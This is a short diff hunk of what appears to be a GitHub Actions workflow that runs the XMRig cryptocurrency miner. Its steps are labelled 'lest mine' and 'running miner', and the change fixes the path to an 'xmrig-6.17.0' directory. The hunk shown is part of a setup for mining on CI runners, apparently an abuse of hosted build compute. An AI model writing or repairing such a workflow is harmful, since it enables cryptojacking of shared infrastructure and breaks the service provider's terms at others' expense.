@@ -41,7 +41,7 @@ jobs:
                 ls
                 
       - name: lest mine
-        run: cd xmrig*
+        run: cd xmrig-6.17.0
         
         
       - name: running miner
